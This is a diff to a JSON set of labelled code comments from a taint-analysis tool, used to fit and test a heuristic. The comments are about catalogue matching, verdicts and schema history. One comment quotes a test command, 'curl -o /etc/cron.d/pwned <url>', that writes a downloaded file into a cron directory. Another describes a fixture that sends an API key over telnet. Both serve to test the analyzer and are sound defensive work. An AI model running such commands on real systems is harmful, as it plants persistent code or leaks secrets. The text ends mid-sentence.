@@ -1,545 +1,1013 @@
 {
- "description": "Comment-only blocks from hypergumbo_core, labelled 1 when they are substantially historical exegesis and 0 when they state a current rule. scripts/archaeology_heuristic.py's weights are fitted to this set; tests/test_archaeology_heuristic.py checks the fit holds.",
+ "description": "Blocks from hypergumbo_core, labelled 1 when they are substantially historical exegesis and 0 when they state a current rule. kind 'comment': comment-only blocks; scripts/archaeology_heuristic.py's weights are fitted to these. kind 'docstring': a seeded random sample of docstrings of 19 or more words, labelled blind to the model's scores; they are held out of the fit and measure how far its scores carry to docstrings. tests/test_archaeology_heuristic.py checks both.",
  "blocks": [
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "INV-fazim. There is no path evidence to judge on — the dst is\nexternal-shaped (`_UNRESOLVED_MODULE_PLACEHOLDERS`) or malformed\nenough that `_extract_callee_module` returns falsy. This used to\nfall through to `return hits[0]`, \"keep the legacy exact-name\nbehaviour rather than silently dropping the finding\" — but that\nis the SAME ungated bare-name match the block above exists to\nrefuse, reached through a different door: not by being a\nfirst-party symbol, but by being flagged resolved while carrying\nnothing to verify the receiver against. ADR-0037 ruling 4 makes\nthe flag authoritative (consumers may not string-check the\n`:unresolved` suffix), so a producer that sets it wrongly landed\nstraight here.\n\nREFUSING IS MEASURED TO COST NOTHING, not argued to. The branch\nwas instrumented on dev 09921c57a1 during real verify-claims runs,\nrecording production's own inputs and classifying them with\nproduction's own `_module_from_symbol_path`: across sops, grype,\nact, poetry, winston and knex — 98,422 calls, 48,516 of them with\nis_resolved=True — this condition held ZERO times. The counted\ncondition is a superset of the branch (it ignores the non-empty\n`hits` requirement), so it errs toward over-reporting. A positive\ncontrol driving the branch deliberately fires it, so the zero is\na property of the inputs and not of a probe that never attached.\n\nThat measurement is what licenses the change, because this index\nalso backs SANITIZER registration: losing a sanitizer match loses\na barrier, which moves flows in the opposite direction from losing\na sink. A line that never executes cannot do either.\n\nPinned by test_taint_pathless_resolved_match_refused.py, which\nships both refusal cases AND two positive controls — refusing\nunconditionally would satisfy the refusal tests alone."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "WI-damir. This used to be an ungated `return hits[0]`, justified as\n\"the symbol is already disambiguated by resolution\". That premise is\nFALSE, and it was the single largest source of non-realizable sinks\non fresh substrate. Resolution establishes WHICH IN-REPO SYMBOL is\ncalled; it says nothing about whether that symbol IS the catalogued\nprimitive. The built-in catalogs describe stdlib and third-party\nsurfaces, so a first-party definition matching one BY NAME ALONE is a\ncategory error — measured 30 of 30 false on the 9-repo cohort:\ncaddy's `func Log() *zap.Logger` (which RETURNS a logger and writes\nnothing) reported as a logging sink 18 times, and d3's `function\nlog()` — the LOGARITHM, building d3.scaleLog — reported as\nconsole.log. The latter is INV-karud's headline example and survived\nWI-zazul because it was never a substring defect.\n\nThe gate cannot be \"resolved edges never match\": a user-supplied\ncatalog may legitimately name a first-party symbol, which is what the\nold comment was protecting. So compare the entry's declared module\nagainst the symbol's own PATH, normalised to module shape. The\ncomponent-aware predicate's SUFFIX arm is what makes that work —\na catalog module of `hypergumbo_core.cli` matches a path of\n`packages/…/hypergumbo_core/cli.py` because the trailing components\nagree, while `log/slog` does not match `logging.go`. The PATH is the\nlonger side there, and its leading components are checkout\ndirectories rather than owner identity, so this caller -- and only\nthis one -- asks for the hint-longer direction (`hint_is_path`); a\nmodule SLOT with extra leading components names a different owner\nand is refused (WI-mujod)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "INV-muhij Finding A: what the WHOLE GROUP reported, for a collapsed row.\n\nThe two scalars above describe ONE finding. On a collapsed row they are\n``grp[0]``'s and nothing recorded what the other members said, so a row\nprinted ``walk_blocked_by: sink_before_source`` while standing for\nmembers whose walk ran, or was blocked somewhere else entirely. Measured\non beads through the production path: 208 groups contain a\n``sink_before_source`` member, 133 of them (63.9%) are NOT unanimous,\nand only 349 of the 1,073 members under them (32.5%) carry it.\n\nTHIS IS A PRECONDITION, NOT A REMEDY. No verdict moves because of\nthese two union fields -- §3a's removal authority (WI-kabif) reads the\nscalar ``walk_verdict``, never these. But INV-muhij's remedy —\nstop a ``sink_before_source`` row from carrying a verdict alone — has to\nread a fact that is true of everything the row stands for, and the\nscalar is not one. A rule may act on ``walk_blocked_by_values ==\n(\"sink_before_source\",)``; it may not act on the scalar.\n\nUNIONED LIKE THEIR FIVE SIBLINGS in :func:`collapse_unadjudicated_flows`,\nand NEVER EMPTY for the same reason the primitive tuples are not:\n``__post_init__`` derives the singleton. ``\"\"`` is a VALUE here (the walk\nran), not an absence — dropping it would make a mixed group read as\nunanimous, which is the exact misreading these fields exist to prevent.\n\n``_values`` rather than a plural because ``walk_blocked_by`` does not\npluralise, and because that is already this project's spelling for\n\"the collapsed sites disagreed about a per-site key\"."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "Every sink CALL SITE this finding stands for, as ``(caller, callee)``\npairs. NOT the callers alone and NOT the callees alone — INV-kakad was\nreopened once by recording only the caller, and the corrected shape is\nthe pair because BOTH sides multiply:\n\n* shellcheck ``striptests`` — ONE callee (``redirect.>``) reached from\nTWO callers (the file node, and ``sponge`` which it reaches). One\nsink name, two sites.\n* kamaraflow ``train_script`` — FOUR callees (``open``, ``file.write``,\n``os.makedirs``, ``shutil.copyfile``) all called from ONE caller.\nOne caller, four sites.\n\nThe record used to carry ``sink_symbols`` (callees) and nothing else, so\nneither multiplicity was visible and three independent refuters read\n``collapsed_flow_count`` as unreconcilable against the repository. With\nthe pairs emitted the multiplier is bounded by\n``len(source_primitives) * len(sink_call_sites)``, and any shortfall is\nreachability having excluded a pair."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "\n``or``, never a plain assignment: ``is_sanitized`` may\nalready be True from the call-graph barrier (a ``callee``\nseed puts the source's own function downstream of the\nseed, so it can reach this line via\n``sanitized_reachable``). This check ADDS a way to earn\nthe label and must never take one away.\n\nWI-joluk, ON BOTH ARMS NOW. This comment read \"AND ONLY\nON THIS ARM ... the §3a arm above tests `is True`, so\n`False` and `None` already collapse there\" — true when\nthe gate landed here first (2026-08-26) and false since\nthe §3a arm began consuming the walk's `False`. Both\narms pass the gate today and the contract test requires\nit. HERE a `False` earns\n`sanitized` and a sanitized flow is dropped from the\nclaim's violation set — so a `False` from a function the\nextractor did not fully see suppresses a real violation.\nForfeiting downgrades that to `None`, which produces\nstrictly FEWER suppressions and therefore strictly MORE\nsurviving violations: the safe direction, and the reason\nthis could land before removal authority existed."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "The first draft used a length heuristic — \"a short alphanumeric segment\nafter a dot is an extension\" — and an existing test refuted it\nimmediately: the module `net.ws` had its real trailing component `ws`\nstripped to `net`, which then failed to match a catalog entry declared as\n`net.ws`. A short component is not evidence of an extension, and no\nlength threshold can separate the two; the set has to be named."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "Dropped qualification: one side is a component-SUFFIX of the other. This\nis how source code normally spells these — Go writes `http.Get` after\nimporting `net/http`, and Java writes `System.in` for\n`java.lang.System.in`, so the hint is routinely the unqualified tail of\nthe catalog's fully-qualified module. Whole components still have to\nmatch, which is what keeps `os`/`chaos` and `grpc`/`…otlptracegrpc`\nrejected.\n\nTHE MATCHED COMPONENTS MUST ALSO AGREE IN CASE (INV-dijor), and this is a\nSTRICTLY WEAKER QUESTION THAN ARM 2'S. Arm 2 asks whether a component IS\ncapitalised, which encodes Go's \"capitals mean types\" in a predicate that\ntakes no language and serves fifteen catalogues — information-free where\nmodule names are capitalised (haskell 100%, swift 97%, objc 95%, elixir\n52%). This arm asks only whether the two sides are SPELLED THE SAME WAY,\nwhich is language-neutral: in those same capitalised-module languages\nboth sides are capitalised, so they agree and every prior match survives.\n\nWHAT IT BUYS. The comment here used to say no capitalisation test applies\nbecause \"the extra components are leading NAMESPACE\". True when the\ntrailing component is a namespace; false when it is a TYPE, which is what\nINV-safig's remedy created by appending the type to the import path. With\nboth sides casefolded, `github.com/gin-gonic/gin.Context` was reachable\nfrom a bare `context` — so sops's `context.String(\"input-type\")`, a\nurfave/cli flag read on a PARAMETER named context, classified as\nnet_send. 1,090 catalogue rows across 9 languages carry a capitalised\ntrailing component and were each matchable from a lowercase variable of\nthe same spelling (python `Path` 40 rows, kotlin `File` 34, elixir `Repo`\n24, haskell `ByteString` 23, rust `File` 23, go `Context` 13).\n\nWHAT IT MUST NOT COST, and why the test file names each one. Java's\nunqualified class references keep matching — `System` against\n`java.lang.System`, both capitalised — and INV-januj and INV-hahak both\ndepend on that arm, so breaking it would re-lose java's only ipc_recv\nrow. Go's `path/filepath` and `google.golang.org/grpc` rows reached from\na bare `filepath` / `grpc` slot, which INV-dijor names as true positives\nat risk from a naive capitalisation test, are lowercase on both sides and\nsurvive.\n\nAND THE ROW MUST BE THE LONGER SIDE (WI-mujod) unless the hint is a\npath-derived module: a slot with MORE leading components than the row\nnames a different owner (`mycsvlib.csv` is not `csv`). Equal lengths\nnever reach here -- equal suffixes are equal lists, arm 1.\n\nThis is EVIDENCE, not the declaration ADR-0051 anticipates: the axiom\nsays the slot names an owner path and that a receiver VARIABLE is the\nnon-conformant notion, and case disagreement is a proxy for that. Arm 2's\ncase-VALUE inference is untouched and remains the residual."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "INV-motos: A CONSTRUCTOR IS A CALL SITE, and the coverage gate has\nsaid so since INV-buzab while this set did not. Its\n``_CALL_SITE_EDGE_TYPES`` carries ``instantiates`` — with a comment\njustifying it, \"a constructor is a genuine classification\nopportunity\" — so a constructor-shaped catalogued primitive was\ncounted EXAMINED by the gate and was structurally untaggable here,\nand \"no chains found\" became ``confirmed``. Measured on the shipped\nCLI with no overlay and no flags, claim\n``{boundary: subprocess, must_not_exist: true}``:\n``subprocess.Popen([...])`` returned ``confirmed`` rc 0 while the\ncontrol ``subprocess.run([...])`` returned ``violated`` rc 1 — same\nclaim, adjacent rows in one catalogue block, only the edge type\ndiffering. 106 classified constructor calls were going untagged\nacross six repos (django 50, hypergumbo itself 27 including one\n``urllib.request.Request``, pretix 15, poetry 12, httpx 2, fastapi\n0), dominated by ``tempfile.TemporaryDirectory`` and\n``subprocess.Popen``. The subset property is now a parity test\n(``test_the_gate_never_counts_an_edge_type_the_tagger_cannot_tag``)\nso the next divergence fails rather than shipping a false all-clear."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "NO AUTO-PROMOTE INTO ``stdlib_modules``. This used to read\n``stdlib_modules_set.add(name)`` on the reasoning that\n\"adding to completeness implies the module is stdlib\", which\nconflates two different facts under one write: \"I enumerated\nthis module's I/O\" (an audit result) and \"this name ships\nwith the interpreter\" (provenance, feeding the supply-chain\necosystem classifier and py_deps). ADR-0016 forbids exactly\nthat conflation for overlays — \"a ``requests`` overlay must\nnot relabel a PyPI package as stdlib; that feeds the\ndependency classifier and the F3 filter, and would be a\nsupply-chain misread rather than an I/O one\" — and\n:func:`load_overlay_catalog` enforces it by popping\n``stdlib_modules``. The auto-promote defeated that pop:\nmeasured, an overlay carrying ONLY a\n``stdlib_module_completeness`` entry for ``requests`` made\n``is_stdlib_module(\"requests\")`` return True on the merged\ncatalogue, while the same overlay spelling it\n``stdlib_modules:`` was correctly stripped. Behaviour-neutral\nfor the shipped catalogues: python.yaml's sole entry\n(``math``) is already in the generated ``stdlib_modules``\nblock, and no other catalogue declares completeness at all."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "The SAME question — \"did control leave this process?\" — asked of the other\nchannel (INV-larol). A boundary here is SYNTHESISED BY A PRODUCER rather than\ndeclared by a catalogue, so ``declares_opaque_crossing`` can never see it: the\nbash analyzer stamps ``meta.io_boundary = \"command_launch\"`` directly on an\nexternal-command edge (bash.py, WI-javoh) because no catalogue describes\nexternal commands: ``io_primitives/bash.yaml`` (INV-vavup) catalogues only\nthe shell's own surface (redirection, environment and host-info expansions)\nand models no command rows, and per ADR-0016's implementation note it is not\ngoing to — cataloguing ``curl`` as ``net_send`` would attribute curl's\nnetwork activity to the shell script, and no clean invariant separates\n``curl`` from ``git``.\n\nDISJOINT FROM ``OPAQUE_BOUNDARIES`` BY CONSTRUCTION, and the split is the\npoint rather than an accident of naming. A catalog-declarable boundary is\ninert unless it is in ``CATALOG_BOUNDARY_TYPES``; a producer-stamped one is\ninert if it IS, because ``IoBoundaryCatalog._from_dict`` iterates exactly that tuple and\nthe catalogue channel would then be the one carrying it. Each set is\nreachable through exactly one channel, and a test asserts each direction —\ncollapsing them into a single set makes one half unreachable whichever way it\nis spelled.\n\nWHY THIS WAS NOT LIVE WHEN IT WAS WRITTEN, and what keeps it shut now. When\nthis was written bash shipped no catalogue, so ``_external_call_sites``\ndropped its edges on ``catalog is None`` and the INV-dabov language gate\nanswered first. ``io_primitives/bash.yaml`` now ships (redirection,\nenvironment and host-info rows, no command rows), so that guard is gone;\ncommand launches stay opaque because verify_claims asks the producer stamp\nFIRST (``_is_producer_stamped_launch``, asked by ``_opaque_launch_sites``\nand by ``_adjudicate_external_modules``, the coverage gate's walk), even\nwhen a catalogue row would also classify the call. The history that\nmotivated that order, measured on the shipped CLI over a two-line script\nwhose only command is\n``curl -o /etc/cron.d/pwned <url>``, claim \"never writes to the host\nfilesystem\": with no bash.yaml, ``inconclusive`` rc 2; with a six-line\n``curl -> net_send`` bash.yaml, ``confirmed`` rc 0 — a green tick over a write\ninto a root cron directory. Declaring ``subprocess`` alongside restores the\nrefusal, which is the control proving the row matched and the boundary\nchoice — not the analyzer's sight — decided the verdict."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "F3 PR-C: per-module exhaustiveness flag. Module names appearing\nhere are treated as closed-world — i.e., we've audited the\nmodule and any unmatched call into it is provably NOT an I/O\nprimitive (so the F3 Filter 2 ``external_potential`` skip is\nsafe for them). The long tail of modules stays unflagged;\nFilter 2 does not fire for them. Each entry's value carries the\n``retrieved:`` date for provenance, paralleling the\ncatalog-level ``stdlib_provenance.retrieved`` field.\n\nNOT ``stdlib_``-PREFIXED ANY MORE, and the rename is the fix rather\nthan cosmetics. Owner, 2026-08-15: \"overlays are where third-party\nstuff goes ... then why would we put anything about stdlib in its\nassociated names? that would be misleading.\" Once an overlay may\ndeclare ``numpy`` or ``tree_sitter`` enumerated, a field named\n``stdlib_*`` holds two populations under a name that describes one —\nthe conceptual leak the fundamental-concept audit exists to catch.\nThe concept was never stdlib-specific; only its AUTHORS were, and\nthat is a fact about who may write the key, not about what it means.\nThe old YAML spelling is still read from SHIPPED catalogues so no\ncurated file had to be rewritten to land the rename."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "SEPARATOR-INSENSITIVE ALIAS (WI-vipur, widened by INV-rilit).\nA caller may spell one primitive three ways and mean the same\nrow. ``qualified_name`` joins with a DOT unconditionally, so a\n``::`` module yields the MIXED ``std::env.consts``; the producer\nemits the language's own ``std::env::consts``; and the old\nscoped-path normalisation emitted ``std.env.consts``.\n\nREGISTERING ONLY THE DOT FORM WAS NOT ENOUGH, and the gap was\ninvisible until something emitted the third spelling. The alias\nwas ``qualified_name.replace(\"::\", \".\")``, which covers the mixed\nand dotted forms and MISSES the fully-colon one — so\n``rust:std::env:0-0:std::env::consts:attribute`` classified as\nNOTHING while the dotted twin matched ``env_read``. Measured as a\npositive control before the producer changed, which is the only\nreason the change did not ship a silent classification loss.\n\nFolding through the one shared normaliser covers all three by\nconstruction rather than by enumerating spellings."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "Hand ``_from_dict`` a status it accepts. ``in_progress`` (partial) is\nwhat an overlay's own row set is, and it must not reach the\nstdlib-provenance validator, which exists for the shipped catalogues. It\nstays on the overlay object: ``load_catalog`` does not let it lower the\ncatalogue it merges into (WI-donod).\n\nWHAT A COMPLETENESS ENTRY COSTS, KEPT ON THE RECORD NOW THAT IT IS\nPERMITTED. It is the single grant of confirmability (INV-buzab), so it is\nthe most powerful thing a user can write here. Measured while it was\nstill refused: a SIX-LINE overlay with zero primitive rows and one\ncompleteness entry for ``telnetlib`` turned the INV-buzab exfiltration\nfixture — which opens a telnet session and writes ``os.environ[\"API_KEY\"]``\ninto it — from ``inconclusive`` rc 2 back to ``confirmed`` rc 0, disclosed\nby nothing but a stderr line naming the overlay path.\n\nThe owner granted it anyway and the reasoning holds: overlays are where\nthird-party goes, the user is the authority on their own dependencies,\nand without this a dependency could never leave the uncatalogued set no\nmatter how carefully it was described — so `verify-claims` could never\nconfirm anything for a repo that has dependencies. Two things keep the\ngrant honest rather than blanket: ``retrieved:`` is still MANDATORY, so\nan entry is an audit record with a date rather than a switch; and it\nstill does not promote the module into ``stdlib_modules`` (see\n``_from_dict``), so vouching for a dependency's I/O never restates it as\nprovenance. The remaining exposure — that the stderr disclosure names the\noverlay PATH but not which modules it vouched for — is real and filed,\nnot fixed here."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "``unvouched`` IS THE STAMP, NOT A THING TO RE-DERIVE. The first\ncut of this loaded each catalogue TWICE and set-differenced the\nkeys to find the community rows -- which agreed with the flag on\nevery language (elixir 144, go 53, haskell 82, python 109, swift\n38) and was still the wrong instrument: the merge already records\nthe answer per row (ADR-0047), and a second derivation of a\nstamped fact is a second home for it, free to drift the first\ntime the merge rules change."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "Module-slot values meaning \"no module identity was recovered\".\n\nTHE CANONICAL HOME. ``taint`` imports this rather than keeping its own copy —\nthe two both filter a module hint before comparing it against a catalogue row,\nand a set that drifted between them would make one consumer treat a sentinel as\na real module name while the other degraded, which is the \"one fact, two homes\"\nshape this module has paid for repeatedly (INV-fokik, INV-zimud).\n\nDELIBERATELY NOT WIDENED HERE. The 2026-09-01 module-key audit measured two\nfurther values it read as non-identities — ``<unknown>`` (minted by\n``_parse_dangling_id`` for malformed ids) and bash's ``redirect`` (47 refs,\nname slot ``>``). ``<unknown>`` is inert: no catalogue rows a primitive it\ncould match. ``redirect`` is NOT a placeholder and must never join this set:\n``io_primitives/bash.yaml`` keys its redirection rows on ``module:\nredirect``, and those rows are how a ``>`` write classifies as ``fs_write``.\nThe audit's \"inert\" was wrong when written (the rows shipped 2026-08-14);\nthe module-key axis now files it under ``namespace`` (WI-daruz)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "Schema version for the ``verify-claims --json`` envelope (WI-nulot / INV-gatog).\n1.0 introduces the top-level object (schema_version + view + verdicts +\nunsupported_taint_languages) replacing the legacy bare JSON array.\n1.2 adds the per-verdict ``excluded_flows`` disclosure bucket (WI-bifob).\nAdditive: every 1.1 key keeps its meaning, and the new key is an empty dict\nwhen nothing was excluded, so a 1.1 consumer that ignores it still reads a\ncorrect verdict — but it would UNDERSTATE what the analysis saw, which is\nwhy this is a version change rather than a silent field addition.\n1.3 adds the per-verdict ``flow_origins`` breakdown and a per-evidence-row\n``source_boundary`` (WI-vazal). Also additive, and deliberately so: the\nalternative considered was RELABELLING database reads away from\n``untrusted_input``, which would have been a silent semantic change to every\nclaim already written against that label. Reporting the split instead means\nno published claim changes meaning and no verdict moves.\n1.4 adds the per-verdict ``analysis_methods`` breakdown and a per-evidence-row\n``confidence`` / ``analysis_method`` (INV-karud clause c). Additive, and a\nversion change rather than a silent field addition for the same reason 1.2\nwas: a 1.3 consumer reading a violated verdict cannot tell a flow the\nADR-0017 §3a walk confirmed by data dependence from one included by call\nreachability alone, and will keep treating every flow as equally supported.\nThis release also stops hardcoding the string ``approximate`` into every\nviolated verdict's ``details`` — that literal made the label unobservable\nfrom BOTH surfaces at once, so no consumer could have noticed the difference.\n1.5 SPLITS the ``excluded_flows`` bucket keys by which rule fired. NOT purely\nadditive, and that is the point: a flow formerly counted under\n``test_sourced`` may now appear under ``benchmark_sourced`` /\n``fixture_sourced`` / ``mock_sourced`` / ``test_support_sourced``. Which\nflows are excluded does not change at all — ``paths.classify_test_file`` IS\n``is_test_file``, the boolean being defined as \"reason is not None\" — only\nwhat they are called. A 1.4 consumer summing the dict still gets the right\ntotal; one keyed on the literal ``test_sourced`` now sees only genuine test\ncode, which is what that key always claimed to mean. This release also\nsplices ``excluded_flows`` and ``flow_origins`` into the VIOLATED path's\n``details``, closing WI-bifob's stated but unimplemented contract that\nexclusions are disclosed on both paths.\n1.6 adds the per-verdict ``sanitized_flows`` count. Sanitized flows now EXIST\n— the propagators emit them labelled instead of pruning them into silence, so\n``TaintFlowFinding.sanitized`` stops being written ``False`` at every\nconstruction site and ``verify_taint_claim``'s ``and not f.sanitized`` stops\nbeing a tautology. Additive: a verdict with no sanitizer on any route reports\n0, exactly as before. No verdict moves — a sanitized flow was already not\ncounted, it was merely not COUNTABLE.\n1.7 adds the top-level ``dataflow_coverage`` block (INV-karud clause a3):\nper-language data-flow capability with the catalog it would serve, a\nfindings-by-analysis-method rollup, and ``inclusion_decided_by``. Additive.\nThe block answers a question no per-flow field can: ``analysis_method`` says\nhow ONE flow was adjudicated, and a reader cannot interpret \"structural\"\nwithout knowing whether the language was capable of anything else.\n1.8 nests ``sanitizer_scope`` inside that block (INV-karud clause b): the\ncatalogue's size, the taint categories it can express, the labels a flow must\ncarry to be reportable as sanitized at all, and ``same_function_honoured_by``.\nAdditive, and it exists because clause (b)'s evidence is unreadable without\nit — the catalogue is entirely cryptographic, so a repository-wide \"0\nsanitized flows\" usually means the claims' labels and the sanitizers' labels\nare disjoint sets rather than that nothing was protected. It also publishes\nthe one shape the call-graph pass structurally cannot honour: a sanitizer\ncalled in the same function as the source (WI-fasub), which the DDG pass now\ndoes honour and which every language without a def/use extractor still misses.\n2.0 adds the ``confirmed_with_caveats`` verdict value and the per-verdict\n``caveats`` list (INV-pojib b/c). NOT additive, and called out as the one\nbreaking bump in this list: a consumer testing ``verdict == \"confirmed\"``\nstops seeing a claim it used to see, and the CLI grows exit code 3. That is\nthe point rather than a side effect — remedy (a1) put the repo-supplied\nsanitizer in the verdict PROSE, and a CI gate reads neither prose nor JSON\ndetails, so the fact stayed invisible to the only consumer that matters.\n\nA NEW CAVEAT *KIND* DOES NOT BUMP THIS, and the rule is worth stating because\ntwo have arrived since 2.0 without one (``displaced_shipped_entry``,\nINV-faput; ``untyped_receiver``, INV-fibis). The shape a consumer parses is\nunchanged — a list of objects each carrying AT LEAST ``kind`` / ``entries`` /\n``detail``, which a consumer already had to tolerate unknown members of, since\nthe kinds present depend on the repo analysed and not on the version. A kind\nmay carry an extra key beside those three (``untyped_receiver`` carries the\n``boundary`` it was scoped to, so a merge can re-render its prose); that is\nadditive within the object and invisible to a consumer reading the three.\nWhat DOES change is which claims are caveated at all, and that is a\nBEHAVIOURAL change disclosed in the changelog rather than a schema one. The\nversion moves when the ENVELOPE moves.\n\nNOR DOES A NEW KEY INSIDE ``catalog_provenance``, and that is worth stating\nbecause three have now arrived without one — ``completeness_grants``\n(INV-tabaf), ``load_bearing_grants`` (WI-lavut) and ``kind_adjudication``\n(INV-nular) — so the convention was being followed without ever being\nwritten, which is how a convention drifts into a disagreement. The reasoning\nis the caveat-kind paragraph's: the shape a consumer parses is unchanged, and\nevery key is always present whether or not it has anything to report, so\nreading one that a consumer does not know about is the same non-event as\nreading a caveat kind it does not know about. A key that CHANGED the meaning\nof an existing one would be a different matter and would bump.\n\n2.2 adds the per-verdict ``analysis_fidelity`` map — language -> the pass IDs\nthat produced the CALL edges this verdict rests on (WI-lagod). Additive: a 2.1\nconsumer ignoring it still reads a correct verdict. It is a version change and\nnot a silent field addition because without it a verdict cannot be compared\nacross runs at all: two runs over one Rust crate differing ONLY in backend\nproduced a BYTE-IDENTICAL verdict block while one carried 10 ``origin=scip``\nnodes and the other zero, so a reader holding the output could not tell which\nanalyzer had spoken. This is the second half of the owner's 2026-08-23 bar —\n\"name what it could not examine, AND AT WHAT ANALYSIS FIDELITY\".\n\nNOT ``analysis_methods``, which already exists and records how the taint walk\nREASONED (``ddg`` / ``ddg_mixed`` / ``structural``). A ``structural`` verdict\nand a tree-sitter verdict are different facts; widening that key into this one\nwould put two concepts under one name.\n\n2.1 makes a violated verdict's evidence row a SITUATION rather than a\nsource->sink pair wherever the pair was not adjudicated (INV-karud), and adds\n``source_primitives`` / ``sink_primitives`` / ``sink_symbols`` /\n``collapsed_flow_count`` to every row. NOT purely additive, and like 1.5 that\nis the point: ``evidence_count`` and the ``details`` count now report\nsituations, so a 2.0 consumer tracking a row total sees it fall (measured\n359 -> 80 across six repositories) WITHOUT any verdict moving and without any\n(source symbol, source primitive, sink primitive, sink symbol) tuple being\ndropped. The old quantity is still available: ``details`` carries a\n``spanning N source->sink pair(s)`` clause and every row carries\n``collapsed_flow_count``. The witness scalars keep their names and stay\nvalid — each is a member of its own set — so a consumer reading\n``sink_primitive`` reads one of the primitives the row names rather than a\nfield that vanished.\n2.3 adds ``walk_verdicts`` inside ``dataflow_coverage`` — the §3a walk's own\nresult for every finding (``confirmed`` / ``escaped`` / ``not_attempted`` /\n``unavailable``, plus ``mixed`` for a collapsed row whose members disagreed\nand ``unrecorded``). ``refuted`` is a key too but always 0 here: a flow\nthe walk refuted is diverted before it becomes a finding and is counted in\n``refuted_flows``. See ADR-0052.\n\nTHIS IS THE BORDERLINE CASE THE catalog_provenance PARAGRAPH ABOVE DESCRIBES,\nand it is called out rather than decided silently. By that rule it would NOT\nbump: the key is always present, always zero-filled, and a 2.2 consumer that\nignores it still reads a correct verdict. It bumps anyway, on 2.2's own\nprecedent — a key that makes an EXISTING key interpretable is a version\nchange, because the existing key was being read wrongly without it.\n``flows_removed_by_walk: 0`` was reasonably read as \"the walk adjudicated\nthese flows and found nothing to remove\". It usually means the walk never got\nto look: only ``refuted`` can remove a flow, and measurement 0007 found\nZERO ``refuted`` rows across 11 repositories while 90.8% of the population\nrested on a walk that never ran. A consumer's correct reading of an unchanged\nkey therefore changes, which is what the \"changed the meaning of an existing\none\" carve-out is for.\n2.4 adds the per-verdict ``resource_naming_flows`` count (WI-bulag / arc T9).\nAn ADDED key, so a 2.3 consumer keeps reading correctly -- but the flows it\ncounts are NO LONGER in ``evidence_count``, which changes the meaning of an\nexisting key and is exactly what the carve-out above exists for. A flow whose\nsink can only have been told WHICH resource to act on is now disclosed here\ninstead of counted as evidence; it remains a TRUE POSITIVE on the correctness\naxis and is excluded on USEFULNESS, structurally and per sink.\n2.5 adds the per-verdict ``trusted_sink_flows`` count (WI-lukoz), on 2.4's\nreasoning: an added key, and the flows it counts are no longer in\n``evidence_count``. ``trust_level: trusted`` on a project sink used to be\ndocumented and inert; it now excludes that sink's flows and discloses them.\n2.6 adds the per-evidence-row ``sink_carriers`` (INV-hopib): the calls a\nstream-object sink was written through. And a stream written ONLY through\ncalls that are themselves sinks in the same zone is no longer a row of its\nown beside them -- ``print(k, file=sys.stderr)`` is one row, not two -- so\n``evidence_count`` and the ``details`` count can fall with no verdict moving,\nwhich is the carve-out's \"changed the meaning of an existing key\".\n3.0 renames the §3a walk verdicts ``confirmed`` / ``unconfirmed`` to\n``reached`` / ``refuted`` (WI-bujum, owner ruling 2026-10-25), in every\nevidence row's ``walk_verdict`` / ``walk_verdict_values`` and the\n``dataflow_coverage.walk_verdicts`` keys. NOT additive, the second breaking\nbump after 2.0: a run printed \"all CONFIRMED\" (the claim holds) beside\n\"walk verdicts: confirmed 3\" (a secret reached a sink), one word for opposite\nfacts. A consumer comparing ``walk_verdict == \"confirmed\"`` must read\n``\"reached\"``. ``refuted`` matches the existing ``refuted_flows`` key.\n3.1 adds the per-verdict ``command_line_flows`` count (WI-zidam), on 2.4's\nreasoning: an added key, and the flows it counts -- untrusted_input from the\nprogram's own command line, a source new in this version -- are not in\n``evidence_count`` unless the claim sets ``include_command_line: true``."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "Caveat kind: the claim held everywhere the analysis could see, and one or\nmore NAMED call sites reach a method the catalogue declares for THIS\nboundary through a receiver whose type the analysis could not determine.\n\nINV-fibis. Reproduced on the shipped CLI with a two-arm control, stdlib\nonly, no overlay and no opaque launch::\n\ndef send_unannotated(sock, payload):          # ARM 1\nreturn sock.sendall(payload)\ndef send_annotated(sock: socket.socket, ...): # ARM 2\nreturn sock.sendall(payload)\n\nARM 2 reports ``violated``; ARM 1 reported **confirmed** — \"This service\nnever sends data over the network\" — about a function whose entire body is a\nnetwork send, while the ``fs_read`` control fired ``violated`` in BOTH arms,\nso the null was not a broken run.\n\nWHY THIS IS NOT A COVERAGE FAILURE. ``_adjudicate_external_modules``\ncounts only a dst that NAMES a module; ARM 1's edge is the bare placeholder\n``python:external:0-0:sendall:external_symbol``, which names none. That skip\nis deliberate and is UNCHANGED — the placeholder is the largest edge\npopulation in a Python repo and identifies no library to report, so counting\nit as an uncatalogued module downgrades nearly every repo to\n``inconclusive`` while telling the reader nothing, which is the outcome\nPR #251 already rejected. ``compute_boundary_coverage`` still returns\n``complete=True`` here.\n\nSO THE FIX IS AT THE VERDICT, AND IT IS THE SIBLING ARGUMENT ONE STEP OVER.\n:data:`CAVEAT_OPAQUE_BOUNDARY`'s own note draws the auditor distinction — a\nDISCLAIMER (\"a 